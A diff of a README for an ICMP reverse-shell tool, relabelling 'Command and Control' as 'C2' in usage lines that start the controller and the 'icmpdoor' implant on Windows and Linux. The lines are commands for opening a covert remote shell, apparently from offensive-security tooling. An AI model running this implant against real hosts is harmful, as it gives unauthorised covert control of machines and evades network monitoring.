@@ -5,19 +5,19 @@ Read [this article](https://cryptsus.com/blog/icmp-reverse-shell.html) for more 
 
 **Python version usage (both Windows and Linux):**
 ```bash
-./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command and Control)
+./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (C2)
 ./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
 ```
 
 **Binary Windows version usage version:**
 ```bash
-./icmp-cnc.exe -d DESTINATION_IP (Command and Control)
+./icmp-cnc.exe -d DESTINATION_IP (C2)
 ./icmpdoor.exe -d DESTINATION_IP (Implant)
 ```
 
 **Binary Linux version usage version:**
 ```bash
-./icmp-cnc -d DESTINATION_IP (Command and Control)
+./icmp-cnc -d DESTINATION_IP (C2)
 ./icmpdoor -d DESTINATION_IP (Implant)
 ```
 
